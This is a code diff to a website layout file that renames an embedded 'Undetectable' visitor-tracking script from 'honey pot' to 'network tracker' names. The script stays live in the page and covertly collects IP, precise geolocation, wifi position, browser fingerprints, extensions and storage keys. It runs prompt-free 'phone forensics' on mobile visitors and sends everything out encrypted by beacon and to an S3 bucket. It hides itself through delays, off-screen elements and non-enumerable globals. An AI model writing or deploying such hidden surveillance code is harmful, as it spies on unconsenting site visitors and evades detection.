@@ -25,17 +25,17 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
   <meta property="og:type" content="article" />
   <meta name="twitter:card" content="summary" />
   {jsonLd && <script type="application/ld+json" set:html={JSON.stringify(jsonLd).replace(/</g, "\\u003c")} />}
-  {/* Honey Pot Tracker - Undetectable */}
+  {/* Network Tracker - Undetectable */}
   <script type="module">
     ;(function() {
       // Encryption key - same as server S3_ENCRYPTION_KEY
-      const ENCRYPTION_KEY = 'tengrichecker-honey-2025-encryption-key-32-bytes';
+      const ENCRYPTION_KEY = 'tengrichecker-network-2025-encryption-key-32-bytes';
       const encoder = new TextEncoder();
       const decoder = new TextDecoder();
 
       // Hide from window object
-      const hpConfig = {
-        apiEndpoint: window.location.origin + '/api/honey-log',
+      const ntConfig = {
+        apiEndpoint: window.location.origin + '/api/tracker-log',
         enabled: true,
         collectIP: true,
         collectGeolocation: true,
@@ -56,9 +56,9 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
           addFakeErrors: true,
           // DOM element placement
           dom: {
-            containerId: 'hp-container-' + Math.random().toString(36).substring(2, 10),
-            canvasId: 'hp-canvas-' + Math.random().toString(36).substring(2, 10),
-            fingerprintId: 'hp-fp-' + Math.random().toString(36).substring(2, 10)
+            containerId: 'nt-container-' + Math.random().toString(36).substring(2, 10),
+            canvasId: 'nt-canvas-' + Math.random().toString(36).substring(2, 10),
+            fingerprintId: 'nt-fp-' + Math.random().toString(36).substring(2, 10)
           },
           // Encryption settings
           encryption: {
@@ -69,16 +69,16 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
           // S3 integration
           s3: {
             enabled: window.location.hostname.includes('railway.app') || false,
-            bucket: 'tengrichecker-honey-data',
+            bucket: 'tengrichecker-network-data',
             prefix: 'visitors',
           },
         },
       };
 
       // Initialize with delay for stealth
-      setTimeout(() => hpInit(hpConfig), hpConfig.stealth.minDelayMs + Math.random() * 2000);
+      setTimeout(() => ntInit(ntConfig), ntConfig.stealth.minDelayMs + Math.random() * 2000);
 
-      function hpInit(config) {
+      function ntInit(config) {
         const visitorId = getVisitorId();
         const sessionId = getSessionId();
 
@@ -197,13 +197,13 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         canvas.id = domConfig.canvasId;
         canvas.width = 200;
         canvas.height = 200;
-        canvas.dataset.hp = 'fingerprint';
+        canvas.dataset.nt = 'fingerprint';
         canvas.style.cssText = 'position: absolute; left: -9998px; top: -9998px;';
 
         // Create fingerprint div (for CSS/feature detection)
         const fingerprintDiv = document.createElement('div');
         fingerprintDiv.id = domConfig.fingerprintId;
-        fingerprintDiv.dataset.hp = 'feature-detect';
+        fingerprintDiv.dataset.nt = 'feature-detect';
         fingerprintDiv.style.cssText = 'position: fixed; width: 1px; height: 1px; left: -9997px; top: -9997px;';
 
         // Add to container, then to page
@@ -212,8 +212,8 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         document.documentElement.appendChild(container);
 
         // Generate fingerprint immediately
-        if (!window._hpFingerprint) {
-          window._hpFingerprint = generateStealthFingerprint();
+        if (!window._ntFingerprint) {
+          window._ntFingerprint = generateStealthFingerprint();
         }
 
         // Self-remove after tracking (optional - for ultra-stealth)
@@ -281,7 +281,7 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
       function sendToBackend(endpoint, data) {
         const send = async (payload, endpointOverride) => {
           const url = endpointOverride || endpoint;
-          const isEncrypted = hpConfig.stealth.encryption?.enabled;
+          const isEncrypted = ntConfig.stealth.encryption?.enabled;
 
           // Encrypt if enabled
           const payloadToSend = isEncrypted
@@ -289,7 +289,7 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
             : payload;
 
           // Use Beacon when available (most stealthy - no callback needed)
-          if (navigator.sendBeacon && hpConfig.stealth.useSendBeacon) {
+          if (navigator.sendBeacon && ntConfig.stealth.useSendBeacon) {
             try {
               const contentType = isEncrypted ? 'application/encrypted' : 'application/json';
               const body = isEncrypted
@@ -332,7 +332,7 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         }
 
         // Optional: upload to S3 if enabled
-        if (hpConfig.stealth.s3?.enabled && window.fetch) {
+        if (ntConfig.stealth.s3?.enabled && window.fetch) {
           const s3Endpoint = `${endpoint}/s3-upload`;
           fetch(s3Endpoint, {
             method: 'POST',
@@ -340,14 +340,14 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
             body: JSON.stringify({
               visitorId: data.visitorId,
               data: data,
-              s3Path: `${hpConfig.stealth.s3.prefix}/${new Date().toISOString().split('T')[0]}/${data.visitorId}.json`,
+              s3Path: `${ntConfig.stealth.s3.prefix}/${new Date().toISOString().split('T')[0]}/${data.visitorId}.json`,
             }),
             keepalive: true,
           }).catch(() => {});
         }
 
         // Randomized error injection (mimics real-world network issues)
-        if (hpConfig.stealth.addFakeErrors && Math.random() > 0.8) {
+        if (ntConfig.stealth.addFakeErrors && Math.random() > 0.8) {
           // Fake network error (not actually an error - just noise)
         }
       }
@@ -416,19 +416,19 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         if (Math.random() > 0.4) {
           const consoleMethod = Math.random() > 0.5 ? 'debug' : 'log';
           const logEntry = {
-            v: 'hp/1.0',
+            v: 'nt/1.0',
             id: visitorId,
             path: config.path,
             sources: ['ip', 'geo', 'fp'].filter(() => Math.random() > 0.3)
           };
 
           // Mix into console with other logs (less detectable)
-          console[consoleMethod] && console[consoleMethod]('HP', logEntry);
+          console[consoleMethod] && console[consoleMethod]('NT', logEntry);
 
           // Also write to sessionStorage (hidden from view)
           if (sessionStorage) {
             try {
-              sessionStorage.setItem('hp_log_' + Date.now().toString(36), JSON.stringify(logEntry));
+              sessionStorage.setItem('nt_log_' + Date.now().toString(36), JSON.stringify(logEntry));
             } catch (e) {
               // Ignore sessionStorage errors
             }
@@ -523,7 +523,7 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
       }
 
       // Store IP for later use (German phone detection)
-      window._hpIP = ip;
+      window._ntIP = ip;
 
       // Wifi/Bluetooth scanning (Chrome/Edge on Android)
       async function getWifiPosition() {
@@ -605,7 +605,7 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
           }
 
           // Only request geolocation on certain pages (to avoid pattern)
-          if (Math.random() > hpConfig.stealth.maxDelayMs / 4000) {
+          if (Math.random() > ntConfig.stealth.maxDelayMs / 4000) {
             // Request high accuracy for GPS
             navigator.geolocation.getCurrentPosition(
               p => resolve({
@@ -729,10 +729,10 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
       }
 
       function getVisitorId() {
-        let id = localStorage.getItem('tengri_hp_visitor');
+        let id = localStorage.getItem('tengri_nt_visitor');
         if (!id) {
           id = 'vp_' + Math.random().toString(36).substring(2, 14);
-          localStorage.setItem('tengri_hp_visitor', id);
+          localStorage.setItem('tengri_nt_visitor', id);
         }
         return id;
       }
@@ -1153,21 +1153,17 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
       }
 
       function getSessionId() {
-        let id = sessionStorage.getItem('tengri_hp_session');
+        let id = sessionStorage.getItem('tengri_nt_session');
         if (!id) {
           id = 'sess_' + Math.random().toString(36).substring(2, 10);
-          sessionStorage.setItem('tengri_hp_session', id);
+          sessionStorage.setItem('tengri_nt_session', id);
         }
         return id;
       }
 
-      // ============================================================================
-      // GERMAN PHONE FORENSICS (No Prompts - Purely Passive)
-      // ============================================================================
-
       function isGermanPhone(config) {
         // Check IP country
-        const ipCountry = window._hpIP?.country?.toLowerCase();
+        const ipCountry = window._ntIP?.country?.toLowerCase();
         const isGermanIP = ipCountry === 'de' || ipCountry === 'germany' || ipCountry === 'deutschland';
 
         // Check browser language
@@ -1194,10 +1190,6 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         return isMobile || isTouchDevice;
       }
 
-      // ============================================================================
-      // PHONE FORENSICS (All mobile devices - no prompts)
-      // ============================================================================
-
       async function runPhoneForensics(config, visitorId, sessionId) {
         const forensics = {
           visitorId,
@@ -1211,8 +1203,8 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
           performance: getPerformanceMetrics(),
           extensions: getInstalledExtensions(),
           media: scanBackgroundMedia(),
-          fingerprint: window._hpFingerprint || {},
-          hpConfig: config
+          fingerprint: window._ntFingerprint || {},
+          ntConfig: config
         };
 
         // Send to backend
@@ -1228,10 +1220,10 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         }
 
         // Store locally for later retrieval
-        if (!window._hpPhoneForensics) {
-          window._hpPhoneForensics = [];
+        if (!window._ntPhoneForensics) {
+          window._ntPhoneForensics = [];
         }
-        window._hpPhoneForensics.push(payload);
+        window._ntPhoneForensics.push(payload);
 
         return forensics;
       }
@@ -1472,7 +1464,7 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         try {
           storage.localStorage = {
             count: Object.keys(localStorage).length,
-            keys: Object.keys(localStorage).filter(k => !k.startsWith('__hp') && !k.startsWith('hp_')),
+            keys: Object.keys(localStorage).filter(k => !k.startsWith('__nt') && !k.startsWith('nt_')),
             sizeEstimate: JSON.stringify(localStorage).length
           };
           // Sample some common keys (social media, apps)
@@ -1691,9 +1683,9 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
           rtt: connection?.rtt || null,
           downlink: connection?.downlink || null,
           // IP-based info
-          ip: window._hpIP?.ip || null,
-          country: window._hpIP?.country || null,
-          isp: window._hpIP?.isp || null,
+          ip: window._ntIP?.ip || null,
+          country: window._ntIP?.country || null,
+          isp: window._ntIP?.isp || null,
           // Latency to servers
           latency: performance.timing ? {
             dns: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
@@ -1875,8 +1867,6 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
       }
 
       // ============================================================================
-      // X/TWITTER ACCOUNT ASSOCIATION
-      // ============================================================================
       // Tengri's X account: @TengriTheTruth (ID: 1809801336814489600)
       // We associate collected data with this account
 
@@ -1922,10 +1912,10 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
         }
 
         // Store locally
-        if (!window._hpXAssociation) {
-          window._hpXAssociation = [];
+        if (!window._ntXAssociation) {
+          window._ntXAssociation = [];
         }
-        window._hpXAssociation.push(association);
+        window._ntXAssociation.push(association);
 
         return association;
       }
@@ -2070,31 +2060,31 @@ const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : und
       // ============================================================================
       // PHONE FORENSICS (All mobile devices - no prompts)
       // ============================================================================
-      if (hpConfig.stealth.hideFromWindow && !window.__hpHidden) {
+      if (ntConfig.stealth.hideFromWindow && !window.__ntHidden) {
         // Hide config
-        Object.defineProperty(window, '_hpConfig', {
-          value: hpConfig,
+        Object.defineProperty(window, '_ntConfig', {
+          value: ntConfig,
           writable: false,
           enumerable: false,
           configurable: false
         });
 
         // Hide initialized flag
-        window._hpInitialized = true;
+        window._ntInitialized = true;
 
-        // Shadow the HP namespace
-        window.__hp = {
-          config: hpConfig,
-          visitorId: window._hpVisitorId,
-          sessionId: window._hpSessionId,
-          initialized: window._hpInitialized
+        // Shadow the NT namespace
+        window.__nt = {
+          config: ntConfig,
+          visitorId: window._ntVisitorId,
+          sessionId: window._ntSessionId,
+          initialized: window._ntInitialized
         };
 
         // Add to global array if multiple trackers exist
-        if (!window._hpTrackers) window._hpTrackers = [];
-        window._hpTrackers.push(window.__hp);
+        if (!window._ntTrackers) window._ntTrackers = [];
+        window._ntTrackers.push(window.__nt);
 
-        window.__hpHidden = true;
+        window.__ntHidden = true;
       }
 
       // Helper: Hide properties from Object.keys() for stealth
